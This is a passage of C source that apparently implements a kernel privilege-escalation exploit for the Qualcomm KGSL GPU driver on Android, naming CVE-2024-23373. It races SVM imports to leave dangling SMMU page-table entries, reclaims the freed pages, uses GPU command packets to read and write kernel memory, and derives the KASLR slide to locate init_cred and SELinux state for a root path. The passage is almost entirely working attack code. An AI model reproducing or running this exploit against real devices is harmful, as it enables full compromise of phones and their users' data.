        (unsigned long long)(cached_kb / 1024), (unsigned long long)(swap_kb / 1024),
        (unsigned long long)(krecl / 1024), (long long)((int64_t)krecl - (int64_t)srecl) / 1024);
}


/* ============ Hole + UAF setup (core) ============ */
static int trigger_dangling(void)
{
    L("=== step 1 (ALLOC-UAF): GPUOBJ_ALLOC(UAF_SIZE, USE_CPU_MAP) -> entry A ===\n");
    uint32_t uaf_id = 0;
    if (gpuobj_alloc(UAF_SIZE, KGSL_MEMFLAGS_USE_CPU_MAP, &uaf_id) != 0 || uaf_id == 0) {
        L("[-] A ALLOC FAILED errno=%d\n", errno); return -1;
    }
    /* Build the CPU view at the requested VA: mmap reaches kgsl's handler and
       the kernel assigns gpuaddr from the VA, so gpuaddr must come back equal
       to HOSTPTR. Every other address here is HOSTPTR plus an offset, and the
       geometry depends on that identity. munmap drops only the CPU view, and it
       has to go: the VMA pins the entry, a pinned entry is not really freed by
       gpuobj_free, and an unfreed frame never returns to buddy. */
    void *v = mmap((void *)HOSTPTR, UAF_SIZE, PROT_READ | PROT_WRITE,
        MAP_FIXED | MAP_SHARED, kgsl_fd, ((off_t)uaf_id) << 12);
    if (v == MAP_FAILED) { L("[-] A mmap FAILED (%s)\n", strerror(errno)); return -1; }
    uint64_t g = 0;
    gpuobj_info(uaf_id, &g);
    L("[+] A: id=%u gpuaddr=0x%llx (HOSTPTR=0x%lx)\n", uaf_id,
        (unsigned long long)g, (unsigned long)HOSTPTR);
    if (g != HOSTPTR) { L("[-] gpuaddr does not equal HOSTPTR; abort\n"); return -1; }
    munmap(v, UAF_SIZE);   /* drop the CPU view; the object and its SMMU mapping stay */

    /* Step 2, the PLACE anchor. The order is a hard precondition: this must
       finish before the race in step 4. The IOVA is in the SVM rbtree as soon
       as gpuobj_alloc succeeds, and mmap only adds a VMA, so a failed mmap is
       logged and deliberately not fatal. */
    L("=== step 2: PLACE anchor (ALLOC + fixed mmap @ PLACE_ADDR) ===\n");
    uint32_t place_id = 0;
    if (gpuobj_alloc(PLACE_SIZE, KGSL_MEMFLAGS_USE_CPU_MAP, &place_id) != 0 || place_id == 0) {
        L("[-] PLACE ALLOC FAILED errno=%d\n", errno); return -1;
    }
    g_place_id = place_id;   /* the 260 MiB frame has to appear in the free list */
    v = mmap((void *)PLACE_ADDR, PLACE_SIZE, PROT_READ | PROT_WRITE,
        MAP_FIXED | MAP_SHARED, kgsl_fd, ((off_t)place_id) << 12);
    if (v == MAP_FAILED) L("[!] PLACE mmap FAILED (%s); the anchor stays in the rbtree\n", strerror(errno));

    L("=== step 3: BOGUS anchor (1 anon page @ BOGUS_ADDR; find_vma precondition) ===\n");
    v = mmap((void *)BOGUS_ADDR, 0x1000, PROT_READ | PROT_WRITE,
        MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (v == MAP_FAILED) { L("[-] BOGUS anchor FAILED (%s)\n", strerror(errno)); return -1; }

    L("=== step 4: wrap import race (bogus_thread) + OVERLAP mmap ===\n");
    /* The window is the warn_alloc on the kvcalloc failure path: pr_warn +
       dump_stack + show_mem take 2-13 ms, and that is the only long stretch in
       which the transient SVM region survives. The ratelimit is global (one
       warning per 10 s), so any earlier vmalloc failure consumes it, the import
       then fails in microseconds, and every attempt misses with ENOMEM. Sleeping
       10 s first guarantees that the first import is the slow one. */
    L("[*] waiting for the warn_alloc ratelimit to reset (10s)...\n");
    sleep(10);
    int enodev = 0, ok = 0, ebusy = 0, eother = 0;
    int attempts = 0;
    while (enodev == 0 && ok == 0 && attempts < 3) {
        attempts++;
        pthread_t th;
        stop_racing = 0;
        pthread_create(&th, NULL, bogus_thread, NULL);
        int a_enodev = 0, a_ok = 0, a_ebusy = 0, a_eother = 0;
        /* Reaching ok >= 5 breaks the inner loop with enodev still 0, so the gate
           below can pass without a single hole punched. The real threshold is the
           step 6 discriminator: no hole means the unmap of FREE(A) fully
           succeeded, so the re-import will succeed and abort. */
        for (int i = 0; i < race_iters && a_ok < 5; i++) {
            uint32_t oid = 0;
            if (gpuobj_alloc(OVER_SIZE, KGSL_MEMFLAGS_USE_CPU_MAP, &oid) != 0 || oid == 0) { a_eother++; continue; }
            errno = 0;
            void *ov = mmap((void *)OVER_ADDR, OVER_SIZE, PROT_READ | PROT_WRITE,
                MAP_FIXED | MAP_SHARED, kgsl_fd, ((off_t)oid) << 12);
            if (ov != MAP_FAILED) { a_ok++; munmap(ov, OVER_SIZE); gpuobj_free(oid); }  /* clean up the leftover region and PTE */
            else if (errno == ENODEV) { a_enodev++; gpuobj_free(oid); if (a_enodev >= 1) { break; } }  /* stop at the first ENODEV: one hit is all the hole needs */
            else if (errno == EBUSY) { a_ebusy++; gpuobj_free(oid); }
            else { a_eother++; gpuobj_free(oid); }
        }
        stop_racing = 1;
        pthread_join(th, NULL);
        enodev = a_enodev; ok = a_ok; ebusy = a_ebusy; eother = a_eother;
        L("[D] race attempt %d done: ok=%d enodev=%d ebusy=%d eother=%d\n", attempts, ok, enodev, ebusy, eother);
        if (enodev == 0 && ok == 0 && attempts < 3) {
            L("[*] miss; retrying in 10s (resets the warn_alloc ratelimit)...\n");
            sleep(10);
        }
    }
    if (enodev == 0 && ok == 0) { L("[-] race missed\n"); return -1; }

    L("=== step 5: GPUOBJ_FREE(A) -> unmap hits the first-page hole -> -ENODEV ignored -> full release ===\n");
    errno = 0;
    WD_START(15);
    int r = gpuobj_free(uaf_id);
    WD_STOP();
    L("[+] FREE(A): ret=%d errno=%d\n", r, errno);

    /* The only success criterion in this function; the race's ENODEV is just a
       symptom. A partially failed unmap makes kgsl_mmu_unmap skip put_gpuaddr,
       so A's SVM region stays in the rbtree and re-importing the same hostptr
       must fail against it - a failure is positive evidence of the UAF, a
       success means the unmap completed and there is no UAF. dmesg is blocked by
       SELinux, so this signal is the only evidence available. */
    L("=== step 6: discriminator; re-import the same hostptr (0x1000) ===\n");
    uint32_t d_id = 0;
    errno = 0;
    WD_START(15);   /* watchdog, 15 s: an import that hangs in the SVM search must exit, not reboot */
    int dr = gpuobj_import_addr(HOSTPTR, 0x1000, KGSL_MEMFLAGS_USE_CPU_MAP, &d_id);
    WD_STOP();
    if (dr == 0) {
        L("[-] discriminator: re-import succeeded = the unmap fully succeeded; no UAF, abort\n");
        gpuobj_free(d_id);
        return -1;
    }
    L("[+] discriminator: re-import failed errno=%d (%s); the SVM region was kept = unmap failure confirmed -> UAF established!\n",
        errno, strerror(errno));
    L("[+] dangling: [0x%llx, 0x%llx) (%u pages); SMMU PTEs left behind\n",
        (unsigned long long)DANGLING_BASE,
        (unsigned long long)(DANGLING_BASE + ((uint64_t)DANGLING_PAGES << 12)), DANGLING_PAGES);
    return 0;
}

/* ============ GPU context + IB (for submit) ============ */
struct gpu_ctx_t { uint32_t ctx; uint32_t ib_id; uint64_t ib_gpuaddr; void *ib_user; uint32_t ctx_ts; };   /* per-ctx timestamp */
static struct gpu_ctx_t corr_g;   /* dedicated context, so probe-phase GPU faults stay isolated */
static int corr_g_ready = 0;

/* Build a context plus its IB. KGSL_CONTEXT_NO_GMEM_ALLOC keeps this context
   out of GMEM accounting, so a fault elsewhere does not charge another object;
   corr_g uses the same flags for the same reason. The 512 KiB IB is headroom:
   the churn batch is 256 KiB, ROSCAN 144 KiB, blind write 16 KiB. MAP_SHARED with USE_CPU_MAP is
   required, because submit_ib copies into g->ib_user and then flushes it with
   gpuobj_sync. Failures are fatal and never retried; some callers park the
   device on failure, so a transient failure can end the run. */
static int setup_ib(struct gpu_ctx_t *g)
{
    struct kgsl_drawctxt_create dc = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC, .drawctxt_id = 0 };
    errno = 0;
    int r = ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &dc);
    if (r != 0 || dc.drawctxt_id == 0) { L("[-] DRAWCTXT FAILED errno=%d\n", errno); return -1; }
    g->ctx = dc.drawctxt_id;
    if (gpuobj_alloc(0x80000, KGSL_MEMFLAGS_USE_CPU_MAP, &g->ib_id) != 0 || g->ib_id == 0) {
        g->ctx = 0;   /* a half-built context makes the retry skip setup and use a NULL IB */
        return -1;
    }
    g->ib_user = mmap(NULL, 0x80000, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, ((off_t)g->ib_id) << 12);
    if (g->ib_user == MAP_FAILED) { g->ctx = 0; return -1; }
    gpuobj_info(g->ib_id, &g->ib_gpuaddr);
    L("[+] IB: ctx=%u id=%u gpuaddr=0x%llx\n", g->ctx, g->ib_id, (unsigned long long)g->ib_gpuaddr);
    return 0;
}

/* Rebuild the context after a GPU fault (EDEADLK/EPROTO); the kgsl handler absorbs it, so it is not a panic */
struct gpu_ctx_t spare_g;

static int rebuild_ctx_empty(struct gpu_ctx_t *g)
    /* Replace only the drawctxt and keep the IB: for the case where the IB is
       fine and only the context is stuck. rebuild_ctx() differs by also swapping
       in the spare IB allocated before the UAF. */
{
    struct kgsl_drawctxt_create dc = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC, .drawctxt_id = 0 };
    /* Same retry shape as rebuild_ctx(): 5 x 300 ms, checking only that the ioctl
       returned 0 without looking at errno. The loop order differs here: this one
       sleeps before testing tr == 4, so a final failure wastes 300 ms; keep both
       in step or the time budget means different things. */
    for (int tr = 0; tr < 5; tr++) { if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &dc) == 0) break; usleep(300*1000); if (tr==4) return -1; }
    g->ctx = dc.drawctxt_id;
    return 0;
}

/* Swap in a fresh drawctxt and re-point the IB fields at spare_g's pre-UAF buffer.
   rebuild_ctx_empty() keeps the original IB for the case where the IB is innocent and only the
   context wedged; this variant assumes the IB may itself be poisoned. After the swap g and
   spare_g alias one gpuobj id and one mmap, so a gpuobj_free() from either side frees an
   object the other still uses. No caller frees it today; the sharing is unguarded. */
static int rebuild_ctx(struct gpu_ctx_t *g)
{
    struct kgsl_drawctxt_create dc = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC, .drawctxt_id = 0 };
   /* Retry on failure. drawctxt_id = 0 asks the kernel for a new id, so EEXIST is not expected
      on the normal path; the count mirrors the kernel's own five -EEXIST retries on a
      process-private open, for a different object. */
   for (int tr = 0; tr < 5; tr++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &dc) == 0) break;
        if (tr == 4) { L("[!] rebuild DRAWCTXT FAILED errno=%d\n", errno); log_fsync(); return -1; }
        usleep(300 * 1000);
    }
    if (spare_g.ib_gpuaddr == 0 || spare_g.ib_user == NULL) {
        struct gpu_ctx_t fresh;
        if (setup_ib(&fresh) == 0) { spare_g = fresh; }
        else { L("[!] IB rebuild failed errno=%d\n", errno); return -1; }
    }
    g->ctx = dc.drawctxt_id;
    g->ib_id = spare_g.ib_id;
    g->ib_user = spare_g.ib_user;
    g->ib_gpuaddr = spare_g.ib_gpuaddr;
    L("[R] context rebuilt (spare IB): ctx=%u ib=0x%llx\n", dc.drawctxt_id, (unsigned long long)spare_g.ib_gpuaddr);
    return 0;
}

/* Single submit.  Serialize timestamp allocation with the heartbeat thread and
   expose the timestamp actually used by this thread to callers that wait for it. */
static uint32_t g_ts = 1;
static pthread_mutex_t submit_mu = PTHREAD_MUTEX_INITIALIZER;
static __thread uint32_t last_submit_ts;
static int submit_ib(struct gpu_ctx_t *g, uint32_t *ib, uint32_t n)
{
    pthread_mutex_lock(&submit_mu);
    memcpy(g->ib_user, ib, n * 4);
    if (gpuobj_sync(g->ib_id, 0, n * 4, KGSL_GPUMEM_CACHE_CLEAN) != 0) {
        int e = errno;
        pthread_mutex_unlock(&submit_mu);
        errno = e;
        return -1;
    }
    struct kgsl_ibdesc d = { .gpuaddr = g->ib_gpuaddr, .__pad = 0, .sizedwords = n, .ctrl = 0 };
    uint32_t ts = ++g->ctx_ts;
    struct kgsl_submit_commands sc = { .context_id = g->ctx, .flags = 0, .cmdlist = &d,
        .numcmds = 1, .synclist = NULL, .numsyncs = 0, .timestamp = ts, .__pad = {0} };
    errno = 0;
    int r = ioctl(kgsl_fd, IOCTL_KGSL_SUBMIT_COMMANDS, &sc);
    if (r == 0) last_submit_ts = ts;
    pthread_mutex_unlock(&submit_mu);
    return r;
}


/* Keepalive context: submits a short heartbeat so the GPU does not idle into a power
   collapse while the corrupted post-UAF state is still live; the collapse link is a
   hypothesis. It has its own context and IB, so it never advances the main path's retire
   timestamps. */
static struct gpu_ctx_t hb_g;
/* File scope, so hb_halt() can stop the thread and observe its exit. */
static pthread_t hb_tid_g;
static volatile int hb_started = 0;
static volatile int hb_exited = 0;
static volatile int hb_stop = 0;
/* Stop the heartbeat: set hb_stop and poll hb_exited for up to 3 s. Idempotent. Once the thread
   is gone the GPU has no further submissions and idles out. The context and fd are left open
   on purpose - closing them runs the driver teardown, which is fatal when main exits. Must be
   called from main, which owns the thread's address space. */
static void hb_halt(void)
{
    static int halt_done = 0;
    if (halt_done) { L("[HB] STOP_HB: already stopped (idempotent, ignored)\n"); return; }
    if (!hb_started) { L("[HB] STOP_HB: heartbeat not started\n"); return; }
    halt_done = 1;
    hb_stop = 1;
    int waited_ms = 0;
    while (!hb_exited && waited_ms < 3000) {
        struct timespec hs = { 0, 50L * 1000 * 1000 };
        nanosleep(&hs, NULL);
        waited_ms += 50;
    }
    L("[HB] halted exited=%d waited=%dms%s\n", (int)hb_exited, waited_ms,
      hb_exited ? "; GPU can enter slumber" : "; 3s timeout (thread still running)");
    log_fsync();
}
static void *hb_main(void *arg)
{
    (void)arg;
    uint32_t ib[16];
    while (!hb_stop) {
        /* The known battery/ksys_sync windows are unsafe for any GPU submit;
           do not let the keepalive defeat wait_clean_band(). */
        if (in_battery_window()) {
            usleep(200 * 1000);
            continue;
        }
        uint32_t len = 0;
        len += cp_nop(&ib[len], 0x0);
        len += cp_wait_mem_writes(&ib[len]);
        len += cp_nop(&ib[len], 0x0);
        int r = submit_ib(&hb_g, ib, len);
        if (r != 0 && errno != EBUSY) {
            static int hb_err_logged = 0;
            if (!hb_err_logged) { L("[!] heartbeat submit errno=%d; continuing\n", errno); hb_err_logged = 1; }
        }
        usleep(2 * 1000 * 1000);
    }
    hb_exited = 1;   /* hb_halt() polls this to confirm the thread left */
    return NULL;
}
static volatile long long g_wd_round;


/* scan_spray() below walks pts_spray_base and press_regs. Nothing in this build
   assigns either, so it reads from a null base and the fault guard swallows every
   access. Kept because the oobprobe mode still calls it. */
void *pts_spray_base = NULL;
#define PRESSURE_SIZE (512UL * 1024 * 1024)
#define MAX_PRESS 16
static void *press_regs[MAX_PRESS];
static int n_press_regs = 0;
#define MAX_PTE_CHUNKS 1024
static size_t pte_chunks[MAX_PTE_CHUNKS];
static size_t n_pte_chunks = 0;
static void segv_handler(int sig, siginfo_t *si, void *ctx) {
    (void)ctx;
    char msg[128];
    int n = snprintf(msg, sizeof(msg),
        "[!] SIGNAL %d si_code=%d si_addr=%p\n", sig, si->si_code, si->si_addr);
    if (n > 0 && !sweep_quiet) {
        ssize_t w1 = write(2, msg, (size_t)n); (void)w1;
        if (logf) { ssize_t w2 = write(fileno(logf), msg, (size_t)n); (void)w2; }
    }
    if (jmp2_armed) { jmp2_armed = 0; siglongjmp(jmpbuf2, 1); }
    if (jmp_armed) { jmp_armed = 0; siglongjmp(jmpbuf, 1); }
    _exit(86);
}


/* Check A: a 0x3D write drops a marker at a dangling gpuaddr.
   Markers come in two groups: the low group (index 0..255) carries 0xCAFE0000|index, the high
   tail carries 0xCAFE0100|index. Scans compare only against 0xCAFE0000, so the high group can
   never be counted as a hit. */


/* Check B: a 0x75 MEMCPY reads the dangling range back.
   Copies 32 bytes at +0x800 from each of the first 256 dangling indices into a buffer and
   invalidates it, so the CPU can compare marker values. Without a UAF the PTE is dead and the
   copy takes an SMMU fault instead. */

/* Check C: the CPU scans sprayed pages for the marker.
   The marker's page has been reclaimed by the spray, so the same physical page now shows up
   in user space. No cache flush is needed: the marker sits on its own cache line.

   The three inputs below are declared and read but never written, so this scan starts from a
   null base and walks zero regions: every probe faults, is caught by the setjmp below, and the
   function returns zero regardless of what the device is doing. Its result gates a branch that
   therefore never fires. Kept because it is part of the diagnostic mode's output, but read its
   numbers as a constant, not as an observation. */

static int scan_spray(void)
{
    L("=== check c: scan the pressure-region and PTE-spray data pages for the marker (+0x800) ===\n");
    int hits = 0;
    uintptr_t baseA0 = ((uintptr_t)pts_spray_base) & ~0x1fffffUL;
    for (uint64_t c = 0; c < 256; c++) {
        uintptr_t A = baseA0 + c * 0x200000;
        volatile uint32_t *p = (volatile uint32_t *)((char *)A + 0x100000 + MARKER_OFF);
        jmp_armed = 1;
        if (sigsetjmp(jmpbuf, 1) != 0) { jmp_armed = 0; continue; }
        uint32_t v = *p;
        jmp_armed = 0;
        if ((v & 0xffff0000) == 0xCAFE0000) {
            if (hits < 4) L("[+] marker hit: PTE-spray chunk %llu page 0x0 idx=%u (0x%08x)\n", (unsigned long long)c, v & 0xffff, v);
            hits++;
        }
    }
    for (int pi = (n_press_regs >= 3 ? n_press_regs - 3 : 0); pi < n_press_regs; pi++) {
        uintptr_t baseP = ((uintptr_t)press_regs[pi]) & ~0x1fffffUL;
        for (uint64_t c = 0; c < 256; c++) {
            uintptr_t A = baseP + c * 0x200000;
            volatile uint32_t *p = (volatile uint32_t *)((char *)A + 0x100000 + MARKER_OFF);
            jmp_armed = 1;
            if (sigsetjmp(jmpbuf, 1) != 0) { jmp_armed = 0; continue; }
            uint32_t v = *p;
            jmp_armed = 0;
            if ((v & 0xffff0000) == 0xCAFE0000) {
                if (hits < 4) L("[+] marker hit: pressure region %d chunk %llu idx=%u (0x%08x)\n", pi, (unsigned long long)c, v & 0xffff, v);
                hits++;
            }
        }
    }
    L("[D] marker_hits: %d\n", hits);
    if (hits > 0) {
        L("\n[+] UAF confirmed: the marker written by the GPU shows up in a spray page = freed physical pages have been reclaimed by user space,"
          "and the SMMU PTEs still point at them; the CVE-2024-23373 chain works end to end (dangling + MOVABLE reclaim)\n");
    }

    L("=== check e: PTE page detection (scans the PTE spray + pressure-region chunks) ===\n");
    n_pte_chunks = 0;
    int faults = 0;
    uintptr_t baseA1 = ((uintptr_t)pts_spray_base) & ~0x1fffffUL;
    for (uint64_t c = 0; c < 256; c++) {
        uintptr_t A = baseA1 + c * 0x200000;
        volatile uint32_t *pg = (volatile uint32_t *)((char *)A + 0x100000 + 0x800);
        jmp_armed = 1;
        if (sigsetjmp(jmpbuf, 1) != 0) { jmp_armed = 0; faults++; continue; }
        uint32_t v = *pg;
        jmp_armed = 0;
        if (v == 0xd503201f) {
            if (n_pte_chunks < MAX_PTE_CHUNKS) pte_chunks[n_pte_chunks++] = (size_t)A;
            if (n_pte_chunks == 1)
                L("[+] first PTE page chunk 0x%zx: read 0x%08x (kernel bytes!)\n", (size_t)A, v);
        }
    }
    for (int pi = 0; pi < n_press_regs; pi++) {
        uintptr_t baseP = ((uintptr_t)press_regs[pi]) & ~0x1fffffUL;
        for (uint64_t c = 0; c < 256; c++) {
            uintptr_t A = baseP + c * 0x200000;
            volatile uint32_t *pg = (volatile uint32_t *)((char *)A + 0x100000 + 0x800);
            jmp_armed = 1;
            if (sigsetjmp(jmpbuf, 1) != 0) { jmp_armed = 0; faults++; continue; }
            uint32_t v = *pg;
            jmp_armed = 0;
            if (v == 0xd503201f) {
                if (n_pte_chunks < MAX_PTE_CHUNKS) pte_chunks[n_pte_chunks++] = (size_t)A;
                if (n_pte_chunks == 1)
                    L("[+] first PTE page chunk 0x%zx: read 0x%08x (kernel bytes!)\n", (size_t)A, v);
            }
        }
    }
    L("[D] faults seen (EL1-only PTEs skipped): %d\n", faults);
    L("[D] PTE page chunks: %d\n", (int)n_pte_chunks);
    if (n_pte_chunks > 0)
        L("[+] PTE overwrite confirmed: page-table pages of %d chunks were rewritten by the GPU (VA->phys 0x10080000)\n", (int)n_pte_chunks);
    return n_pte_chunks > 0 ? 1 : 0;
}
/* Control: a 0x3D write into a known-good buffer is read back, to rule out false negatives.
   This control waits with usleep(200 ms) instead of wait_submit_retire; every other readback
   path uses the retire counter. */
/* LLCC churn and the CPU storm */
/* CHURN: pre-UAF GPU buffer (no CPU map). GPU-side writes fill the LLCC (outer WB-RA-WA,
   "UPSTREAM" MAIR attr) -> evict the P4 ops/size lines to DRAM. */
static uint32_t churn_id;

static uint64_t churn_g;

/* Fill CHURN_MB with CP_MEM_WRITE; the trailing wait retires the last batch along with the rest. */
static uint32_t CHURN_MB = 8;   /* chosen from churn_sizes[] = {8,2,1} after the trigger */
#define CHURN_IB_DWORDS 65536   /* cp_mem_write takes 4 dwords: (65536-4)/4 = 16383 data dwords per submit */
static int llcc_churn(struct gpu_ctx_t *g)
{
    uint32_t *ib = malloc(CHURN_IB_DWORDS * 4 + 8);
    if (!ib) { L("[-] churn malloc fail\n"); return -1; }
    uint64_t total = (uint64_t)CHURN_MB * 1024 * 1024;
    uint32_t per_ib = (CHURN_IB_DWORDS - 4) / 4;   /* cp_mem_write = 4 dwords */
    uint32_t n_sub = (uint32_t)((total + (uint64_t)per_ib * 4 - 1) / ((uint64_t)per_ib * 4));
    L("[*] LLCC churn: %u MB via %u submits (buf gpuaddr=0x%llx)\n", CHURN_MB, n_sub, (unsigned long long)churn_g);
    uint64_t off = 0;
    uint32_t last_ts = 0;
    for (uint32_t s = 0; s < n_sub; s++) {
        if (s > 0 && (s % 32) == 0) wait_clean_band();   /* batch-window gate: no submit inside it */
        uint32_t len = 0;
        len += cp_nop(&ib[len], 0x0);
        uint32_t cnt = per_ib;
        if (off + (uint64_t)cnt * 4 > total) cnt = (uint32_t)((total - off) / 4);
        for (uint32_t k = 0; k < cnt; k++)
            len += cp_mem_write(&ib[len], churn_g + off + (uint64_t)k * 4, 0x5a5a0000u + off + k);
        off += (uint64_t)cnt * 4;
        len += cp_wait_mem_writes(&ib[len]);
        len += cp_nop(&ib[len], 0x0);
        WD_START(30);
        int r = submit_ib(g, ib, len);
        WD_STOP();
        if (r != 0) { L("[!] churn submit %u fault errno=%d\n", s, errno); rebuild_ctx(g); free(ib); return -1; }
        last_ts = last_submit_ts;
    }
    wait_submit_retire(g->ctx, last_ts);
    free(ib);
    L("[+] LLCC churn done\n");
    return 0;
}

/* CPU storm: without it another core's stale copy of the cache line holding memdesc ops@+0x48 and flags@+0x50 is written back over the values the GPU just corrupted. */
static void _storm_core(unsigned long mask)
{
    sched_setaffinity(0, sizeof(mask), (const cpu_set_t *)&mask);
    volatile uint8_t *cb = mmap(NULL, 8UL*1024*1024, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (cb == MAP_FAILED) return;
    for (int ka = 0; ka < 40; ka++) {
        for (size_t ci = 0; ci < 8UL*1024*1024; ci += 64) cb[ci] = (uint8_t)ka;
    }
    munmap((void *)cb, 8UL*1024*1024);
}
static void cpu_storm_v2(void)
{
    for (int core = 0; core < 8; core++) {
        _storm_core(1UL << core);
    }
}

/* Guarded GPU-side memdesc readback (CP_MEMCPY 0x75); the four diag_* globals hold the last read only. */
static uint64_t diag_ops, diag_flags, diag_size, diag_phys;
/* Runtime KASLR-derived addresses; never fall back silently to static symbols. */
#define STATIC_OPS_ADDR       0xffffffc01215d308ULL
#define STATIC_INIT_CRED      0xffffffc012b080f8ULL
#define STATIC_SELINUX_STATE  0xffffffc012cac000ULL
/* runtime_ops_addr is the corruption target, runtime_init_cred_addr feeds the root path, and
   runtime_selinux_state_addr has no user. runtime_ops_addr is written before the derived
   addresses are validated and keeps its value on failure, so callers must use the return
   value. */
static uint64_t runtime_ops_addr, runtime_init_cred_addr, runtime_selinux_state_addr;
static int runtime_kaslr_valid;
/* Derive the KASLR slide from a read-back memdesc.ops. Three conditions, all required: the value
   comes from the entry gpu_read_memdesc identified, its top 32 bits carry the 0xffffffc0
   kernel linear map marker for VA_BITS=39, and the slide is 2 MB aligned. Any failure returns
   -1 instead of falling back to the static symbols. */
static int derive_runtime_kernel_addrs(uint64_t observed_ops)
{
    int64_t slide = (int64_t)(observed_ops - STATIC_OPS_ADDR);
    if ((observed_ops >> 32) != 0xffffffc0U || (slide & 0x1fffff) != 0) {
        runtime_kaslr_valid = 0;
        return -1;
    }
    runtime_ops_addr = observed_ops;
    runtime_init_cred_addr = (uint64_t)((int64_t)STATIC_INIT_CRED + slide);
    runtime_selinux_state_addr = (uint64_t)((int64_t)STATIC_SELINUX_STATE + slide);
    if ((runtime_init_cred_addr >> 32) != 0xffffffc0U ||
        (runtime_selinux_state_addr >> 32) != 0xffffffc0U) {
        runtime_kaslr_valid = 0;
        return -1;
    }
    runtime_kaslr_valid = 1;
    L("[+] runtime KASLR slide=0x%llx ops=0x%llx init_cred=0x%llx selinux=0x%llx\n",
      (unsigned long long)slide, (unsigned long long)runtime_ops_addr,
      (unsigned long long)runtime_init_cred_addr,
      (unsigned long long)runtime_selinux_state_addr);
    return 0;
}
static int gpu_read_memdesc(struct gpu_ctx_t *g, uint64_t ep, uint32_t dst_id,
        void *dst_u, uint64_t dst_g, const char *tag)
{
    /* 2 (NOP) + 8*6 (CP_MEMCPY) + 1 (WAIT) + 2 (NOP) = 53 dwords. */
    uint32_t ib[53];
    uint32_t len = 0;
    len += cp_nop(&ib[len], 0x0);
    /* Eight 32-bit reads: ops, flags, size and phys, low half then high half, landing at dst+0x2000. */
    struct { uint32_t off; uint64_t src; } rd[8] = {
        { 0x2000, ep + 0x48 }, { 0x2004, ep + 0x4c },
        { 0x2008, ep + 0x50 }, { 0x200c, ep + 0x54 },
        { 0x2010, ep + 0x30 }, { 0x2014, ep + 0x34 },
        { 0x2018, ep + 0x28 }, { 0x201c, ep + 0x2c },
    };
    for (int k = 0; k < 8; k++)
        len += cp_memcpy(&ib[len], 1, rd[k].src, dst_g + rd[k].off);
    len += cp_wait_mem_writes(&ib[len]);
    len += cp_nop(&ib[len], 0x0);
    /* Poison the destination so a no-op cannot be mistaken for a zero readback. */
    volatile uint32_t *b = (volatile uint32_t *)((char *)dst_u + 0x2000);
    for (int k = 0; k < 8; k++) b[k] = 0xD00DFEEDu;
    if (gpuobj_sync(dst_id, 0x2000, 32, KGSL_GPUMEM_CACHE_CLEAN) != 0) {
        L("[D] %s memdesc destination CLEAN failed errno=%d\n", tag, errno);
        log_fsync(); return -1;
    }
    WD_START(20);
    int r = submit_ib(g, ib, len);
    WD_STOP();
    if (r != 0) { L("[D] %s memdesc read-back submit fault errno=%d\n", tag, errno); log_fsync(); return -1; }
    if (wait_submit_retire(g->ctx, last_submit_ts) != 0) {
        L("[D] %s memdesc read-back wait fault errno=%d\n", tag, errno);
        log_fsync(); return -1;
    }
    if (gpuobj_sync(dst_id, 0x2000, 32, KGSL_GPUMEM_CACHE_INV) != 0) {
        L("[D] %s memdesc destination INVALIDATE failed errno=%d\n", tag, errno);
        log_fsync(); return -1;
    }
    uint64_t ops = (uint64_t)b[1] << 32 | b[0];
    uint64_t fls = (uint64_t)b[3] << 32 | b[2];
    uint64_t sz  = (uint64_t)b[5] << 32 | b[4];
    uint64_t ph  = (uint64_t)b[7] << 32 | b[6];
    diag_ops = ops; diag_flags = fls; diag_size = sz; diag_phys = ph;
    L("[D] %s GPU view: ops=0x%016llx flags=0x%016llx size=0x%016llx phys=0x%016llx\n",
        tag, (unsigned long long)ops, (unsigned long long)fls,
        (unsigned long long)sz, (unsigned long long)ph);
    log_fsync();
    return 0;
}

static int gpu_read_one(struct gpu_ctx_t *g, uint64_t ep, uint32_t dst_id,
        void *dst_u, uint64_t dst_g, uint32_t src_off, uint32_t dst_off,
        uint32_t *out, const char *tag)
{
    uint32_t ib[16], len = 0;
    len += cp_nop(&ib[len], 0);
    len += cp_memcpy(&ib[len], 1, ep + src_off, dst_g + dst_off);
    len += cp_wait_mem_writes(&ib[len]);
    len += cp_nop(&ib[len], 0);
    volatile uint32_t *p = (volatile uint32_t *)((char *)dst_u + dst_off);
    *p = 0xD00DFEEDu;
    if (gpuobj_sync(dst_id, dst_off, 4, KGSL_GPUMEM_CACHE_CLEAN) != 0) {
        L("[!] %s cache-clean errno=%d\n", tag, errno); return -1;
    }
    if (submit_ib(g, ib, len) != 0) {
        L("[!] %s submit errno=%d\n", tag, errno); return -1;
    }
    if (wait_submit_retire(g->ctx, last_submit_ts) != 0) {
        L("[!] %s wait errno=%d\n", tag, errno); return -1;
    }
    if (gpuobj_sync(dst_id, dst_off, 4, KGSL_GPUMEM_CACHE_INV) != 0) {
        L("[!] %s cache-inv errno=%d\n", tag, errno); return -1;
    }
    if (out) *out = *p;
    L("[D] %s src+0x%x -> 0x%08x\n", tag, src_off, *p);
    return 0;
}

/* gpu_read_one with CP_MEM_TO_MEM (0x73) instead of CP_MEMCPY (0x75); otherwise line-for-line
   equivalent. The SLIDE / PTJ-SCAN / PTJ-RD / PCSCAN single-field read primitives use it
   directly; only p2diag falls back to it, and only when the two memdesc.ops dwords fail under
   0x75, which separates a permission fault from a packet or buffer problem. */
static int gpu_read_one_m2m(struct gpu_ctx_t *g, uint64_t ep, uint32_t dst_id,
        void *dst_u, uint64_t dst_g, uint32_t src_off, uint32_t dst_off,
        uint32_t *out, const char *tag)
{
    uint32_t ib[16], len = 0;
    len += cp_nop(&ib[len], 0);
    len += cp_mem_to_mem(&ib[len], ep + src_off, dst_g + dst_off);
    len += cp_wait_mem_writes(&ib[len]);
    len += cp_nop(&ib[len], 0);
    volatile uint32_t *p = (volatile uint32_t *)((char *)dst_u + dst_off);
    *p = 0xD00DFEEDu;
    if (gpuobj_sync(dst_id, dst_off, 4, KGSL_GPUMEM_CACHE_CLEAN) != 0) {
